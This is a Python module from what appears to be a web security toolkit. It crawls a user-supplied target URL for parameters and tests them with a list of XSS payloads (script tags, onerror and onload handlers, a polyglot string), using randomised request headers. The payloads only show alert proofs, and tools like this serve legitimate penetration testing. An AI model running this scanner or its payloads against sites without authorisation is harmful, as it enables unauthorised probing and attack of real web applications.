# modules/xss_scan.py
import requests
import random
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from core.randomizer import HeaderFactory
from core.utils import clear_console, header_banner

console = Console()

header_factory = HeaderFactory(pool_size=500)

def get_xss_payloads():
    """
    Returns a list of payloads for Cross-Site Scripting (XSS) detection,
    including basic, obfuscated, and polyglot payloads.
    """
    return [
        # Basic Payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Obfuscated Payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "<svg/onload=alert`1`>",
        
        # Polyglot Payload (works in multiple contexts)
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*\"`'/**/alert(1)//'>",
        
        # Event Handler Payloads
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    ]

def discover_links_and_params(base_url, headers):
    """
    Crawls a URL to find links and form parameters to test.
    """
    console.print(f"[cyan]Crawling {base_url} to discover links and parameters...[/cyan]")
    links_to_scan = {base_url}
    discovered_params = set()

    try:
        response = requests.get(base_url, headers=headers, timeout=10, allow_redirects=True)
        soup = BeautifulSoup(response.content, "html.parser")

        # Find parameters in forms
        for form in soup.find_all("form"):
            for input_tag in form.find_all("input"):
                if name := input_tag.get("name"):
                    discovered_params.add(name)

        # Find links and parameters in hrefs
        for a_tag in soup.find_all("a", href=True):
            href = a_tag['href']
            full_url = urljoin(base_url, href)
            parsed_full_url = urlparse(full_url)
            if urlparse(base_url).netloc == parsed_full_url.netloc:
                links_to_scan.add(full_url)
                if parsed_full_url.query:
                    params = re.findall(r'([^=&]+)=', parsed_full_url.query)
                    discovered_params.update(params)

    except requests.RequestException as e:
        console.print(f"[yellow]Could not crawl {base_url}: {e}[/yellow]")

    console.print(f"[green]Discovered {len(links_to_scan)} links and {len(discovered_params)} parameters.[/green]")
    return list(links_to_scan), list(discovered_params) if discovered_params else ['q', 'search', 'query']

def run_xss_scan():
    """
    Main function to execute the Cross-Site Scripting (XSS) vulnerability scan.
    """
    clear_console()
    header_banner(tool_name="XSS Scanner")
    url = console.input("\n[bold]Enter target URL: [/]").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    headers = header_factory.get_headers()
    payloads = get_xss_payloads()

    try:
        links_to_scan, discovered_params = discover_links_and_params(url, headers)
        if not discovered_params:
            console.print("[yellow]No parameters discovered. Testing with common defaults.[/yellow]")

        report = Table(title=f"XSS Report for {urlparse(url).netloc}", style="bright_white", header_style="bold #ff7675", expand=True)
        report.add_column("Location")
        report.add_column("Parameter")
        report.add_column("Payload")
        report.add_column("Status")

        total_tests = len(links_to_scan) * len(discovered_params) * len(payloads)
        progress = Progress(SpinnerColumn(), "[progress.description]{task.description}", BarColumn(), "{task.completed}/{task.total}", TextColumn("[bold green]{task.fields[status]}"), transient=True)

        with Live(report, console=console, screen=False):
            with progress:
                task = progress.add_task("[cyan]Scanning for XSS...", total=total_tests, status="Initializing...")
                for link in links_to_scan:
                    for param in discovered_params:
                        for payload in payloads:
                            progress.update(task, advance=1, status=f"Testing {param} on {link[:50]}...")
                            test_url = f"{link}?{param}={payload}"
                            try:
                                response = requests.get(test_url, headers=headers, timeout=10, allow_redirects=False)
                                # Check if the payload is reflected in the response body
                                if payload in response.text:
                                    report.add_row(f"[cyan]{link}[/cyan]", f"[magenta]{param}[/magenta]", f"[bright_black]{payload[:30]}...[/]", "[red]Vulnerable[/red]")
                            except requests.RequestException:
                                continue
            console.print(Panel(report, title="[bold]Scan Complete[/bold]", style="#ff7675"))

    except requests.RequestException as e:
        console.print(f"[bold red]Error: Could not connect to target. {e}[/bold red]")
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred: {e}[/bold red]")

if __name__ == "__main__":
    run_xss_scan()
